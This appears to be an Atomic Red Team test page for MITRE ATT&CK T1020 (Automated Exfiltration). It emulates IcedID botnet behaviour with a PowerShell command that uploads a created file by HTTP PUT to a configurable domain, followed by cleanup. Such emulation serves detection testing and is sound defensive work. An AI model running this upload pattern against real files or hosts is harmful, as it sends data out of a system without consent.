---
tags: [T1020, atomic_test]
filename: "[[T1020 - Automated Exfiltration]]"
---
# T1020 - Automated Exfiltration

## Atomic Test #1 - IcedID Botnet HTTP PUT
Creates a text file
Tries to upload to a server via HTTP PUT method with ContentType Header
Deletes a created file

**Supported Platforms:** Windows


**auto_generated_guid:** 9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| file | Exfiltration File | string | C:&#92;temp&#92;T1020_exfilFile.txt|
| domain | Destination Domain | url | https://google.com|


#### Attack Commands: Run with `powershell`! 


```powershell
$fileName = "#{file}"
$url = "#{domain}"
$file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
$contentType = "application/octet-stream"
try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
```

#### Cleanup Commands:
```powershell
$fileName = "#{file}"
Remove-Item -Path $fileName -ErrorAction Ignore
```





<br/>
